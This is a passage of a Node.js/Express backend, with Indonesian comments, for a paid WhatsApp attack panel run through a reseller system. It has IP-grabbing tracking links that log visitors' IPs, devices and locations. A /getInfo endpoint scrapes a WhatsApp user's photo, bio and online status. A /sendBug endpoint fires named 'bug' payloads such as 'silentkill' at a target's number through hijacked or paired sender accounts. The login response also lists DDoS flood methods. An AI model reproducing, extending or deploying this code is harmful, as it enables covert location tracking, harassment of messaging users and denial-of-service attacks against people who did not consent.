        .filter(l => l.trim() !== "")
        .map(l => l.trim())
        .reverse()
        .slice(0, 50);
    }

    res.json({ valid: true, total: logs.length, logs: logs });
  } catch (e) {
    res.json({ valid: true, total: 0, logs: [] });
  }
});


// ════════════════════════════════════════════════════════════════════════════
// IP TRACKER — LINK TRACKING
// ════════════════════════════════════════════════════════════════════════════

// ─── BUAT LINK TRACKING ─────────────────────────────────────
app.get("/track/create", async (req, res) => {
  const { key, redirect } = req.query;

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key" });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.json({ valid: false, message: "User not found" });

  const allowedRoles = [
    "owner", "dev", "tk", "tangan kanan", "admin",
    "reseller", "member", "vip", "moderator", "partner",
    "founder", "high admin", "high owner"
  ];
  const userRole = (user.role || "member").toLowerCase();
  if (!allowedRoles.includes(userRole)) {
    return res.json({ valid: false, message: "Access denied" });
  }

  const trackingId = crypto.randomBytes(8).toString("hex");
  const redirectUrl = redirect || "https://www.google.com";

  ipLogs[trackingId] = {
    id: trackingId,
    owner: user.username,
    redirectUrl: redirectUrl,
    createdAt: new Date().toISOString(),
    hits: []
  };

  const trackingUrl = "http://" + req.headers.host + "/track/" + trackingId;

  console.log("[IP TRACKER] Link created: " + trackingId + " by " + user.username);

  res.json({
    valid: true,
    trackingId: trackingId,
    trackingUrl: trackingUrl,
    redirectUrl: redirectUrl
  });
});

// ─── LINK YANG DIKIRIM KE TARGET ────────────────────────────
 app.get("/track/:id", (req, res) => {
  const { id } = req.params;

  if (!ipLogs[id]) {
    return res.status(404).send("<h1>404 - Link tidak ditemukan</h1>");
  }

  // ─── AMBIL IP REAL (PRIORITAS CF-Connecting-IP) ─────────
  let ip = 
    req.headers['cf-connecting-ip']                          // Cloudflare
    || req.headers['x-real-ip']                              // Nginx
    || req.headers['x-forwarded-for']?.split(',')[0]?.trim() // Proxy
    || req.headers['x-client-ip']
    || req.headers['x-cluster-client-ip']
    || req.headers['forwarded']?.split(';')[0]?.split('=')[1]
    || req.connection?.remoteAddress 
    || req.socket?.remoteAddress
    || req.ip
    || "unknown";

  // Clean IP (hapus ::ffff: prefix + port)
  ip = cleanIpAddress(ip);

  const userAgent = req.headers['user-agent'] || "Unknown";
  const language = req.headers['accept-language'] || "Unknown";
  const referer = req.headers['referer'] || "None";

  // ─── DETECT DEVICE ──────────────────────────────────────
  let device = "Unknown";
  const ua = userAgent.toLowerCase();
  if (ua.includes("android")) device = "Android";
  else if (ua.includes("iphone")) device = "iPhone";
  else if (ua.includes("ipad")) device = "iPad";
  else if (ua.includes("windows")) device = "Windows";
  else if (ua.includes("mac")) device = "Mac";
  else if (ua.includes("linux")) device = "Linux";

  // ─── DETECT BROWSER ─────────────────────────────────────
  let browser = "Unknown";
  if (ua.includes("chrome")) browser = "Chrome";
  else if (ua.includes("firefox")) browser = "Firefox";
  else if (ua.includes("safari")) browser = "Safari";
  else if (ua.includes("edge")) browser = "Edge";
  else if (ua.includes("opera")) browser = "Opera";

  console.log("[IP TRACKER] 📥 Hit from: " + ip + " | CF: " + (req.headers['cf-connecting-ip'] || "none") + " | XFF: " + (req.headers['x-forwarded-for'] || "none"));

  ipLogs[id].hits.push({
    ip: ip,
    userAgent: userAgent,
    device: device,
    browser: browser,
    language: language,
    referer: referer,
    timestamp: new Date().toISOString()
  });

  fs.appendFileSync("ip_track_log.txt",
    "[" + new Date().toISOString() + "] ID: " + id + " | IP: " + ip + " | Device: " + device + " | Browser: " + browser + "\n"
  );

  console.log("[IP TRACKER] ✅ Hit! ID: " + id + " | IP: " + ip);

  res.redirect(ipLogs[id].redirectUrl);
});

// ─── LIHAT HASIL TRACKING ───────────────────────────────────
app.get("/track/result/:id", async (req, res) => {
  const { id } = req.params;
  const { key } = req.query;

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key" });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.json({ valid: false, message: "User not found" });

  if (!ipLogs[id]) {
    return res.json({ valid: false, message: "Tracking ID not found" });
  }

  if (ipLogs[id].owner !== user.username && user.role !== "owner") {
    return res.json({ valid: false, message: "You don't own this tracking" });
  }

  const hits = ipLogs[id].hits;
  const enrichedHits = [];

  for (const hit of hits) {
    let geo = null;
    const cleanIp = cleanIpAddress(hit.ip || "");

    // Skip private/local IP
    const isPrivate = 
      !cleanIp ||
      cleanIp === "unknown" ||
      cleanIp === "::1" ||
      cleanIp.startsWith("10.") ||
      cleanIp.startsWith("127.") ||
      cleanIp.startsWith("192.168.") ||
      cleanIp.startsWith("172.16.") ||
      cleanIp.startsWith("172.17.") ||
      cleanIp.startsWith("172.18.") ||
      cleanIp.startsWith("172.19.") ||
      cleanIp.startsWith("172.2") ||
      cleanIp.startsWith("172.30.") ||
      cleanIp.startsWith("172.31.");

    if (!isPrivate) {
      try {
        const geoResult = await lookupIPGeo(cleanIp);
        
        if (geoResult.success) {
          geo = {
            city: geoResult.city,
            region: geoResult.region,
            country: geoResult.country,
            countryCode: geoResult.countryCode,
            isp: geoResult.isp,
            lat: geoResult.lat,
            lon: geoResult.lon,
            timezone: geoResult.timezone,
            source: geoResult.source
          };
        }
      } catch (e) {
        console.error("[TRACKER] Geo error for " + cleanIp + ":", e.message);
      }
    }

    enrichedHits.push({ 
      ...hit, 
      ip: cleanIp,
      geo: geo 
    });
  }

  res.json({
    valid: true,
    trackingId: id,
    owner: ipLogs[id].owner,
    redirectUrl: ipLogs[id].redirectUrl,
    createdAt: ipLogs[id].createdAt,
    totalHits: enrichedHits.length,
    hits: enrichedHits
  });
});

// ─── LIST SEMUA TRACKING ────────────────────────────────────
app.get("/track/list", async (req, res) => {
  const { key } = req.query;

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key" });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.json({ valid: false, message: "User not found" });

  const canViewAll = ["owner", "dev", "admin"].includes((user.role || "").toLowerCase());

  const list = Object.values(ipLogs)
    .filter(t => canViewAll || t.owner === user.username)
    .map(t => ({
      id: t.id,
      owner: t.owner,
      redirectUrl: t.redirectUrl,
      createdAt: t.createdAt,
      totalHits: t.hits.length
    }));

  res.json({ valid: true, total: list.length, trackings: list });
});


app.get("/getInfo", async (req, res) => {
  const { key, number } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false });

  const bizKeys = Object.keys(biz);
  if (!bizKeys.length) return res.json({ valid: false, message: "No connection" });

  const sock = biz[bizKeys[Math.floor(Math.random() * bizKeys.length)]];
  const jid = number.includes("@") ? number : number + "@s.whatsapp.net";

  try {
    const ppUrl = await sock.profilePictureUrl(jid, 'image').catch(() => null);
    const statusObj = await sock.fetchStatus(jid).catch(() => null);
    const check = await sock.onWhatsApp(number).catch(() => []);
    const info = check[0] || {};

    return res.json({
      valid: true,
      number: number,
      photo: ppUrl || "https://static.vecteezy.com/system/resources/previews/009/292/244/non_2x/default-avatar-icon-of-social-media-user-vector.jpg",
      bio: statusObj?.status || "No bio",
      online: !!statusObj?.lastSeen,
      type: info.biz ? "business" : "personal"
    });
  } catch (err) {
    console.warn("[❌ GETINFO ERROR]", err.message);
    return res.json({ valid: false, message: "Query failed" });
  }
});

const KEY_LIST_FILE = path.join(__dirname, 'keyList.json');

function loadKeyList() {
  try {
    return JSON.parse(fs.readFileSync(KEY_LIST_FILE, 'utf8'));
  } catch {
    return [];                // file belum ada / rusak → mulai kosong
  }
}

function saveKeyList(list) {
  fs.writeFileSync(KEY_LIST_FILE, JSON.stringify(list, null, 2));
}

function recordKey({ username, key, role, ip, androidId }) {
  const list = loadKeyList();
  const stamp = new Date().toISOString();
  const idx = list.findIndex(e => e.username === username);

  if (idx !== -1) {
    list[idx] = { username, lastLogin: stamp, sessionKey: key, ipAddress: ip, androidId };
  } else {
    list.push({ username, lastLogin: stamp, sessionKey: key, ipAddress: ip, androidId });
  }

  saveKeyList(list);
}

  const news = [
    {
      image: "https://d.top4top.io/p_3756oyh031.jpg",
      desc: "Buy Acces Chat andipmx"
    },
    {
      image: "https://d.top4top.io/p_3756oyh031.jpg",
      title: "AX RRG",
      desc: "Join channel pemxx08andi"
    }
  ];

// ===== Endpoint: Login & Key Fetch (version 3.0 required) =====
app.post("/validate", (req, res) => {
const { username, password, version, androidId } = req.body;

if (!androidId) {
  return res.json({ valid: false, message: "androidId required" });
}

const db = loadDatabase();
const userIdx = db.findIndex(u => u.username === username && u.password === password);
const user = db[userIdx];

if (!user) return res.json({ valid: false });

// Auto-generate pairId kalau belum ada
if (!user.pairId) {
  user.pairId = genPairId();
  db[userIdx] = user;
  saveDatabase(db);
}

if (isExpired(user)) {
  return res.json({ valid: true, expired: true });
}

// Cek apakah device sama
const keyList = loadKeyList();
const existingSession = keyList.find(e => e.username === username);
if (existingSession && existingSession.androidId !== androidId) {
  // device berbeda, override
  console.log(`[📱] Device login baru, override session untuk ${username}`);
}

// generate key baru & override
const key = generateKey();
activeKeys[key] = {
  username,
  created: Date.now(),
  expires: Date.now() + 10 * 60 * 1000,
};

recordKey({
  username,
  key,
  role: user.role || 'member',
  ip: req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip,
  androidId,
});

const ddosList = [
  { ddos_id: "udp", ddos_name: "UDP Flood" },
  { ddos_id: "tcp", ddos_name: "TCP SYN Flood" },
  { ddos_id: "http", ddos_name: "HTTP Flood" },
  { ddos_id: "icmp", ddos_name: "ICMP Flood" },
];

const payloadList = [
  { payload_id: "standard", payload_name: "Standard" },
  { payload_id: "amplified", payload_name: "Amplified" },
];

return res.json({
  valid: true,
  expired: false,
  key,
  expiredDate: user.expiredDate,
  role: user.role || "member",
  pairId: user.pairId || null,
  listBug: bugs,
  listDDoS: ddosList,
  listPayload: payloadList,
  news
});
});

app.get("/myInfo", (req, res) => {
  const { username, password, androidId, key } = req.query;
  console.log("[ℹ️ INFO] Fetching info for:", username);

  const db = loadDatabase();
  const user = db.find(u => u.username === username && u.password === password);
  const keyList = loadKeyList();
  const userKey = keyList.find(k => k.username === username);
  console.log(userKey)

  if (!userKey) {
    console.log("[❌ KEY] Invalid or missing session key.");
    return res.json({ valid: false, reason: "session" });
  }

  if (userKey.androidId !== androidId) {
    console.log("[⚠️ DEVICE] Device mismatch:", userKey.androidId, "!=", androidId);
    return res.json({ valid: false, reason: "device" });
  }

  if (!user) {
    console.log("[❌ INFO] User not found.");
    return res.json({ valid: false });
  }

  if (isExpired(user)) {
    console.log("[⚠️ INFO] User expired.");
    return res.json({ valid: true, expired: true });
  }

  recordKey({
    username,
    key,
    role: user.role || 'member',
    ip: req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip,
    androidId
  });

  console.log("[✅ INFO] Info dikirim untuk:", username);

  return res.json({
    valid: true,
    expired: false,
    key,
    username: user.username,
    password: "******",
    expiredDate: user.expiredDate,
    role: user.role || "member",
    pairId: user.pairId || null,
    listBug: bugs,
    news: news // ✅ Tambahkan ini
  });
});

app.post("/changepass", (req, res) => {
  const { username, oldPass, newPass } = req.body;
  if (!username || !oldPass || !newPass) {
    return res.json({ success: false, message: "Incomplete data" });
  }

  const db = loadDatabase();
  const idx = db.findIndex(u => u.username === username && u.password === oldPass);
  if (idx === -1) {
    return res.json({ success: false, message: "Invalid credentials" });
  }

  db[idx].password = newPass;
  saveDatabase(db);

  return res.json({ success: true, message: "Password updated successfully" });
});

app.get("/sendBug", async (req, res) => {
  const { key, bug } = req.query;
  let { target } = req.query;
  target = (target || "").replace(/\D/g, ""); // hapus semua karakter non-digit
  console.log(`[📤 BUG] Send bug to ${target} using key ${key} - Bug: ${bug}`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ BUG] Key tidak valid.");
    return res.json({ valid: false });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) {
    console.log("[❌ BUG] User tidak ditemukan.");
    return res.json({ valid: false });
  }

  // ===== Role-based Cooldown =====
  const roleCooldowns = {
    member: 300,
    reseller: 240,
    reseller1: 60,
    owner: 0,
    vip: 60,
  };
  const role = user.role || "member";
  const cooldownSeconds = roleCooldowns[role] || 60;

  if (!user.lastSend) user.lastSend = 0;

  const now = Date.now();
  const diffSeconds = Math.floor((now - user.lastSend) / 1000);
  if (diffSeconds < cooldownSeconds) {
    console.log(`${user.username} Still Cooldown`)
    return res.json({
      valid: true,
      sended: false,
      cooldown: true,
      wait: cooldownSeconds - diffSeconds,
    });
  }

  // ============ Respon Duluan ============ //
  user.lastSend = now;
  saveDatabase(db); // Penting! Simpan waktu kirim ke file
  console.log(`${user.username} Trigger Cooldown`);

  // Cek apakah ada active socket/sender
  const hasSender = Object.keys(activeConnections).length > 0;
  res.json({
    valid: true,
    sended: true,
    senderOn: hasSender,
    cooldown: false,
    role
  });
  
setImmediate(async () => {
  const sock = await checkActiveSessionInFolder(user.username);
  if (!sock) {
    console.warn(`[❌ NO SOCK] Tidak ada koneksi aktif tersedia.`);
    return;
  }

  const targetJid = target + "@s.whatsapp.net";

  // ─── SPECIAL CASE: silentkill ───
  if (bug === 'silentkill') {
    try {
      await bug_silentkill(sock, targetJid, {
        rounds: 3,
        delay: 1500,
        useCall: true,
        useStickerPack: true,
        useAlbum: true,
        useNested: true,
        useProtocol: true
      });
      console.log(`[✅ BUG] silentkill terkirim ke ${target}`);
    } catch (e) {
      console.warn(`[❌ BUG] silentkill error:`, e.message);
    }
    return;
  }

  // ─── BUG LAINNYA (pakai registry) ───
  const bugFn = BUG_REGISTRY[bug];

  if (!bugFn) {
    console.log(`[BUG] Unknown bug: ${bug}`);
    return;
  }

  try {
    await bugFn(sock, targetJid);
    console.log(`[✅ BUG] ${bug} terkirim ke ${target}`);
  } catch (e) {
    console.warn(`[❌ BUG] ${bug} error:`, e.message);
  }
});
});

function getActiveCredsInFolder(subfolderName) {
  const folderPath = path.join('vanzzmd', subfolderName);
  if (!fs.existsSync(folderPath)) return [];

  const jsonFiles = fs.readdirSync(folderPath).filter(f => f.endsWith(".json"));
  const activeCreds = [];

  for (const file of jsonFiles) {
    const sessionName = `${path.basename(file, ".json")}`;
    if (activeConnections[sessionName]) {
      activeCreds.push({
          sessionName: sessionName
      });
    }
  }

  return activeCreds;
}

// GET /mySender
// ─── Sender Management Endpoints ─────────────────────────────────────────────

// Public senders list (stored per-session in memory + file)
const publicSenderSet = new Set(JSON.parse(fs.existsSync('./publicSenders.json') 
  ? fs.readFileSync('./publicSenders.json','utf8') : '[]'));

function savePublicSenders() {
  fs.writeFileSync('./publicSenders.json', JSON.stringify([...publicSenderSet]));
}

// GET /setSenderPublic - semua role bisa add sender public, owner bisa remove
app.get("/setSenderPublic", (req, res) => {
  const { key, session, public: makePublic } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false, error: "Invalid key" });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.status(401).json({ valid: false, error: "User not found" });

  // Semua role bisa jadikan public
  if (makePublic === 'true') {
    publicSenderSet.add(session);
    savePublicSenders();
    return res.json({ valid: true, message: `${session} dijadikan public` });
  } else {
    // Remove dari public — owner only
    if (user.role !== 'owner') {
      return res.status(403).json({ valid: false, error: "Hanya owner yang bisa remove public sender" });
    }
    publicSenderSet.delete(session);
    savePublicSenders();
    return res.json({ valid: true, message: `${session} dijadikan private` });
  }
});

// GET /deleteSender - hapus private sender
app.get("/deleteSender", (req, res) => {
  const { key, session } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false });
  
  // Tutup koneksi jika ada
  if (activeConnections[session]) {
    try { activeConnections[session].end(); } catch(e) {}
    delete activeConnections[session];
  }
  publicSenderSet.delete(session);
  savePublicSenders();
  return res.json({ valid: true, message: "Sender dihapus" });
});

// GET /deletePublicSender - hapus public sender (owner only)
app.get("/deletePublicSender", (req, res) => {
  const { key, session } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false });
  
  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user || user.role !== 'owner') return res.status(403).json({ valid: false, error: "Only owner" });
  
  if (activeConnections[session]) {
    try { activeConnections[session].end(); } catch(e) {}
    delete activeConnections[session];
  }
  publicSenderSet.delete(session);
  savePublicSenders();
  return res.json({ valid: true, message: "Public sender dihapus" });
});

// ─────────────────────────────────────────────────────────────────────────────
app.get("/mySender", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ error: "Invalid session key" });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.status(401).json({ error: "User not found" });

  const conns = getActiveCredsInFolder(user.username);
  console.log(user.username)
  // APK expects connections: { private: [...], global: [...] }
  // Map each active session to connection object
  const privateConns = conns.map(c => ({
    sessionName: c.sessionName,
    number: c.sessionName,
    type: 'private',
    status: 'connected',
    isPublic: publicSenderSet.has(c.sessionName)
  }));
  return res.json({
    valid: true,
    connections: {
      private: privateConns,
      global: privateConns.filter(c => c.isPublic)
    }
  });
});

// 🔹 Endpoint getPublicSenders - ambil semua sender yang ditandai public
app.get("/getPublicSenders", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false, error: "Invalid session key" });

  try {
    const publicList = [];
    // Cari semua active connection yang ada di publicSenderSet
    for (const [sessionName, sock] of Object.entries(activeConnections)) {
      if (publicSenderSet.has(sessionName)) {
        publicList.push({
          sessionName,
          number: sessionName,
          type: 'public',
          status: 'connected',
          owner: 'owner'
        });
      }
    }
    return res.json({ valid: true, senders: publicList });
  } catch(e) {
    return res.json({ valid: true, senders: [] });
  }
});

// 🔹 Endpoint device-permission - simpan/ambil permission akses device per username
const devicePermFile = './device_perms.json';
function loadDevicePerms() {
  try {
    if (require('fs').existsSync(devicePermFile)) {
      return JSON.parse(require('fs').readFileSync(devicePermFile, 'utf8'));
    }
  } catch(e) {}
  return {};
}
function saveDevicePerms(data) {
  require('fs').writeFileSync(devicePermFile, JSON.stringify(data, null, 2));
}

// GET /devicePerms - ambil permission untuk username ini
app.get("/devicePerms", (req, res) => {
  const { key, username } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false });
  
  const perms = loadDevicePerms();
  const userPerm = perms[username?.toLowerCase()] || { approved: false, allDevices: false, devices: [] };
  
  // Owner selalu approved
  const db = loadDatabase();
  const requester = db.find(u => u.username === keyInfo.username);
  if (requester?.role === 'owner' || keyInfo.username?.toLowerCase() === username?.toLowerCase()) {
    // Owner cek dirinya sendiri
    const isOwner = requester?.role === 'owner';
    if (isOwner && keyInfo.username === username) {
      return res.json({ valid: true, approved: true, allDevices: true, devices: [] });
    }
  }
  
  return res.json({ valid: true, ...userPerm });
});

// POST /setDevicePerm - owner atur permission user lain
app.post("/setDevicePerm", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false, error: "Invalid session key" });
  
  const db = loadDatabase();
  const requester = db.find(u => u.username === keyInfo.username);
  if (!requester || requester.role !== 'owner') {
    return res.status(403).json({ valid: false, error: "Only owner can manage permissions" });
  }
  
  const { username, approved, allDevices, devices } = req.body;
  if (!username) return res.status(400).json({ valid: false, error: "Username required" });
  
  const perms = loadDevicePerms();
  perms[username.toLowerCase()] = {
    approved: approved === true || approved === 'true',
    allDevices: allDevices === true || allDevices === 'true',
    devices: Array.isArray(devices) ? devices : []
  };
  saveDevicePerms(perms);
  
  return res.json({ valid: true, message: "Permission updated" });
});

// GET /listDevicePerms - owner lihat semua permission
app.get("/listDevicePerms", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false });
  const db = loadDatabase();
  const requester = db.find(u => u.username === keyInfo.username);
  if (!requester || requester.role !== 'owner') return res.status(403).json({ valid: false });
  const perms = loadDevicePerms();
  return res.json({ valid: true, perms });
});

// 🔹 Endpoint getPairing
app.get("/getPairing", async (req, res) => {
  const { key, number } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ BUG] Key tidak valid.");
    return res.json({ valid: false });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!keyInfo) return res.status(401).json({ error: "Invalid session key" });

  if (!number) return res.status(400).json({ error: "Number is required" });

  try {
  const sessionDir = path.join('vanzzmd', user.username, number); 

  if (!fs.existsSync(`vanzzmd/${user.username}`)) fs.mkdirSync(`vanzzmd/${user.username}`);
  if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir);

  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
  const { version } = await fetchLatestWaWebVersion();

  const sock = makeWASocket({
    keepAliveIntervalMs: 50000,
    logger: pino({ level: "silent" }),
    auth: state,
    syncFullHistory: true,
    markOnlineOnConnect: true,
    connectTimeoutMs: 60000,
    defaultQueryTimeoutMs: 0,
    generateHighQualityLinkPreview: true,
    browser: ["Ubuntu", "Chrome", "20.0.04"],
    version
  });

  sock.ev.on("creds.update", saveCreds);

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const isLoggedOut = lastDisconnect?.error?.output?.statusCode === DisconnectReason.loggedOut;
      if (!isLoggedOut) {
        console.log(`🔄 Reconnecting ${number}...`);
        await waiting(3000);
        await pairingWa(number, user.username);
      } else {
        delete activeConnections[number];
      }
    }
  });
  // 🔹 Kalau belum registered, generate pairing code
  if (!sock.authState.creds.registered) {
    await waiting(1000);
    let code = await sock.requestPairingCode(number);
    console.log(code)
    if (code) {
      return res.json({ valid: true, number, pairingCode: code });
    } else {
      return res.json({ valid: false, message: "Already registered or failed to get code" });
    }
  }
  } catch (err) {
    return res.status(500).json({ error: err.message });
  }
});


// ===== Create Account =====
app.get("/createAccount", (req, res) => {
  const { key, newUser, pass, day } = req.query;
  console.log(`[👤 CREATE] Request create user '${newUser}' dengan key '${key}'`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ CREATE] Key tidak valid.");
    return res.json({ valid: false, error: true, message: "Invalid key." });
  }

  const db = loadDatabase();
  const creator = db.find(u => u.username === keyInfo.username);

  if (!creator || !["reseller", "owner", "reseller1"].includes(creator.role)) {
    console.log(`[❌ CREATE] ${creator?.username || "Unknown"} tidak memiliki izin.`);
    return res.json({ valid: true, authorized: false, message: "Not authorized." });
  }

  // 🔐 Batasi maksimal 30 hari jika role adalah reseller
  if (creator.role === "reseller" && parseInt(day) > 30) {
    console.log("[❌ CREATE] Reseller tidak boleh membuat akun lebih dari 30 hari.");
    return res.json({ valid: true, created: false, invalidDay: true, message: "Reseller can only create accounts up to 30 days." });
  }

  if (db.find(u => u.username === newUser)) {
    console.log("[❌ CREATE] Username sudah digunakan.");
    return res.json({ valid: true, created: false, message: "Username already exists." });
  }

  const expired = new Date();
  expired.setDate(expired.getDate() + parseInt(day));

  const newAccount = {
    username: newUser,
    password: pass,
    expiredDate: expired.toISOString().split("T")[0],
    role: "member",
    pairId: genPairId(),
  };

  db.push(newAccount);
  saveDatabase(db);
    
  console.log("[✅ CREATE] Akun berhasil dibuat:", newAccount);
  const logLine = `${creator.username} Created ${newUser} duration ${day}\n`;
  fs.appendFileSync('logUser.txt', logLine);

  return res.json({ valid: true, created: true, user: newAccount });
});

// ===== Delete User (admin only) =====
app.get("/deleteUser", (req, res) => {
  const { key, username } = req.query;
  console.log(`[🗑️ DELETE] Request hapus user '${username}' oleh key '${key}'`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ DELETE] Key tidak valid.");
    return res.json({ valid: false, error: true, message: "Invalid key." });
  }

  const db = loadDatabase();
  const admin = db.find(u => u.username === keyInfo.username);

  if (!admin || admin.role !== "owner") {
    console.log(`[❌ DELETE] ${admin?.username || "Unknown"} bukan owner.`);
    return res.json({ valid: true, authorized: false, message: "Only owner can delete users." });
  }

  const index = db.findIndex(u => u.username === username);
  if (index === -1) {
    console.log("[❌ DELETE] User tidak ditemukan.");
    return res.json({ valid: true, deleted: false, message: "User not found." });
  }

  const deletedUser = db[index];
  db.splice(index, 1);
  saveDatabase(db);
        
  const logLine = `${admin.username} Deleted ${deletedUser}\n`;
  fs.appendFileSync('logUser.txt', logLine);

  console.log("[✅ DELETE] User berhasil dihapus:", deletedUser);
  return res.json({ valid: true, deleted: true, user: deletedUser });
});

app.get('/ping', (req, res) => {
  res.send('pong');
});

// ===== Show All Users (admin only) =====
app.get("/listUsers", (req, res) => {
  const { key } = req.query;
  console.log(`[📋 LIST] Request lihat semua user oleh key '${key}'`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ LIST] Key tidak valid.");
    return res.json({ valid: false, error: true, message: "Invalid key." });
  }

  const db = loadDatabase();
  const admin = db.find(u => u.username === keyInfo.username);

  if (!admin || admin.role !== "owner") {
    console.log(`[❌ LIST] ${admin?.username || "Unknown"} bukan owner.`);
    return res.json({ valid: true, authorized: false, message: "Only owner can view users." });
  }

  const users = db.map(u => ({
    username: u.username,
    expiredDate: u.expiredDate,
    role: u.role || "member",
  }));

  return res.json({ valid: true, authorized: true, users });
});

// ===== Add User With Role (owner only) =====
app.get("/userAdd", (req, res) => {
  const { key, username, password, role, day } = req.query;
  console.log(`[➕ USERADD] ${username} dengan role ${role} oleh key ${key}`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });

  const db = loadDatabase();
  const creator = db.find(u => u.username === keyInfo.username);

  if (!creator || (creator.role !== "owner" && creator.role !== "dev")) {
    console.log("[❌ USERADD] Tidak diizinkan.");
    return res.json({ valid: true, authorized: false, message: "Only owner can add user with role." });
  }

  if (db.find(u => u.username === username)) {
    console.log("[❌ USERADD] Username sudah ada.");
    return res.json({ valid: true, created: false, message: "Username already exists." });
  }

  const expired = new Date();
  expired.setDate(expired.getDate() + parseInt(day));

  const newUser = {
    username,
    password,
    role: role || "member",
    expiredDate: expired.toISOString().split("T")[0],
    pairId: genPairId(),
  };

  db.push(newUser);
  saveDatabase(db);
    
  const logLine = `${creator.username} Created ${newUser} Role ${role} Days ${day}\n`;
  fs.appendFileSync('logUser.txt', logLine);
  console.log("[✅ USERADD] User berhasil dibuat:", newUser);
  return res.json({ valid: true, authorized: true, created: true, user: newUser });
});

// ===== Edit User Expired Date (reseller or owner) =====
app.get("/editUser", (req, res) => {
  const { key, username, addDays } = req.query;
  console.log(`[🛠️ EDIT] Tambah masa aktif ${username} +${addDays} hari oleh key ${key}`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });

  const db = loadDatabase();
  const editor = db.find(u => u.username === keyInfo.username);

  if (!editor || !["reseller", "owner"].includes(editor.role)) {
    console.log("[❌ EDIT] Tidak diizinkan.");
    return res.json({ valid: true, authorized: false, message: "Only reseller or owner can edit user." });
  }

  // 🔐 Batasi maksimal 30 hari jika role adalah reseller
  if (editor.role === "reseller" && parseInt(addDays) > 30) {
    return res.json({ valid: true, authorized: false, message: "Reseller can only add up to 30 days." });
  }

  const targetUser = db.find(u => u.username === username);
  if (!targetUser) {
    console.log("[❌ EDIT] User tidak ditemukan.");
    return res.json({ valid: true, edited: false, message: "User not found." });
  }

  // ✅ Tambahan validasi role untuk reseller
  if (editor.role === "reseller" && targetUser.role !== "member") {
    console.log("[❌ EDIT] Reseller hanya bisa mengedit user dengan role 'member'.");
    return res.json({ valid: true, edited: false, message: "Reseller hanya bisa mengedit user dengan role 'member'." });
  }

  const currentDate = new Date(targetUser.expiredDate);
  currentDate.setDate(currentDate.getDate() + parseInt(addDays));
  targetUser.expiredDate = currentDate.toISOString().split("T")[0];

  saveDatabase(db);
  const logLine = `${editor.username} Edited ${targetUser} Add Days ${addDays}\n`;
  fs.appendFileSync('logUser.txt', logLine);
  console.log("[✅ EDIT] Masa aktif diperbarui:", targetUser);
  return res.json({ valid: true, authorized: true, edited: true, user: targetUser });
});

// ===== GET /getLog =====
app.get("/getLog", (req, res) => {
  const { key } = req.query;

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);

  // Allow owner and admin to view logs; member only sees own logs
  const canViewAll = user && (user.role === "owner" || user.role === "admin");

  try {
    let logs = [];
    if (fs.existsSync("logUser.txt")) {
      const logContent = fs.readFileSync("logUser.txt", "utf-8");
      const lines = logContent.split("\n").filter(l => l.trim() !== "");
      logs = lines.map((line, i) => {
        // Parse: "actor Action target [detail]"
        const parts = line.trim().split(/\s+/);
        const actor = parts[0] || "system";
        const action = parts[1] || "activity";
        const target = parts[2] || "";
        const detail = parts.slice(3).join(" ");
        return {
          id: i + 1,
          timestamp: new Date(Date.now() - (lines.length - i) * 60000).toISOString(),
          activity: action.toLowerCase(),
          actor,
          target,
          description: line.trim(),
          details: {
            target: target || null,
            actor: actor || null,
            info: detail || null
          }
        };
      }).reverse(); // newest first
    }

    // Filter by user if not owner/admin
    if (!canViewAll && user) {
      logs = logs.filter(l => l.actor === user.username || l.target === user.username);
    }

    return res.json({ valid: true, authorized: canViewAll, logs });
  } catch (err) {
    return res.json({ valid: true, authorized: false, logs: [], error: "Failed to read log file." });
  }
});

// ============================================================
// API PREFIX ROUTER - Map semua /api/xxx/yyy ke endpoint asli
// ============================================================

// --- /api/auth/* ---
